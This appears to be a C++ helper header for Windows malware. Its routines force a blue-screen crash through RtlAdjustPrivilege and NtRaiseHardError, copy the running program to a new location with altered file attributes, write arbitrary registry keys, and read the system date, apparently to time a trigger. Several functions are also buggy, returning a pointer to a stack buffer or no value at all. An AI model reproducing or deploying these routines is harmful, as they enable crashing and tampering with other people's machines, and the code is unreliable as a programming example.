typedef HANDLE MEMORYPARAM;
typedef LPDWORD *NTBSODPARAM;
#define memcrt HeapCreate
#define memdsy HeapDestroy

INT WINAPI EndThread(HANDLE hThread, MEMORYPARAM mpParam) {
	CloseHandle(hThread);
	memdsy(mpParam);
}

INT WINAPI Redraw(VOID) {
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
}

LPCWSTR FILENAME(VOID) {
	WCHAR wBuffer[MAX_PATH];
	GetModuleFileNameW(NULL, (WCHAR *)wBuffer, MAX_PATH);
	return (CONST WCHAR *)wBuffer;
}

#define DATE_YEAR 0
#define DATE_MONTH 1
#define DATE_DAY 2

extern "C" {
	NTSTATUS WINAPI RtlAdjustPrivilege(DWORD dwRtlPrivilege, BYTE bEnable, BYTE bClient, BYTE *Unused);
	NTSTATUS WINAPI NtRaiseHardError(NTSTATUS ntStatusCode, DWORD dwParamNum, DWORD dwOemStrParamMask, NTBSODPARAM ppdwParam, DWORD dwRspOption, DWORD *lpdwRsp);
}

DWORD SHUTDOWN_PRIVILEGE = 19;
DWORD OPTION_SHUTDOWN = 6;

MEMORYPARAM CreateMemoryParam(VOID) {
	memcrt(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0);
}

namespace System {
	INT WINAPI ExtCopyFile(LPCWSTR lpcwOriginalFile, LPCWSTR lpcwNewFile, DWORD dwFileAttributes) {
		CopyFileW(lpcwOriginalFile, lpcwNewFile, TRUE);
		SetFileAttributesW(lpcwNewFile, dwFileAttributes);
	}
	
	VOID adjshutpriv(VOID) {
		/* tf is this shitty code - said Violet Evergarden */
		BYTE UNUSED;
		RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &UNUSED);
	}
	
	LONG64 WINAPI NtCrashSystem(DWORD dwErrorStatus, BOOL togglecustom, LPCTSTR lpctParam) {
		DWORD UNUSED;
		adjshutpriv();
		switch (togglecustom) {
			case false: {
				NtRaiseHardError(dwErrorStatus, 0, 0, NULL, OPTION_SHUTDOWN, &UNUSED);
				break;
			}
			case true: {
				NtRaiseHardError(dwErrorStatus, 0, 0, (NTBSODPARAM)lpctParam, OPTION_SHUTDOWN, &UNUSED);
				break;
			}
		}
	}
	
	INT DateCheck(INT date) {
		SYSTEMTIME lpSystemTime;
		GetSystemTime(&lpSystemTime);
		switch (date) {
			case DATE_YEAR: {
				return lpSystemTime.wYear;
				break;
			}
			case DATE_MONTH: {
				return lpSystemTime.wMonth;
				break;
			}
			case DATE_DAY: {
				return lpSystemTime.wDay;
				break;
			}
		}
	}
	
	FLONG WINAPI ManageRegW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, BYTE lpData, LPBYTE lpData2, bool isSet, bool isString) {
	    HKEY hkResult;
	    if (isSet == false) {
	        if (isString == false) {
	            RegCreateKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
	        }
	        else if (isString == true) {
	            RegCreateKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
	        }
	    }
	    else if (isSet == true) {
	        if (isString == false) {
	            RegOpenKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
	        }
	        else if (isString == true) {
	            RegOpenKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
	        }
	    }
	}
	
	INT ifWindowsXP(VOID) {
		OSVERSIONINFOW versionInformation;
		memset(&versionInformation, 0, sizeof(OSVERSIONINFOW));
		versionInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
		GetVersionExW(&versionInformation);
		if (versionInformation.dwMajorVersion == 5) return TRUE;
		return FALSE;
	}
}
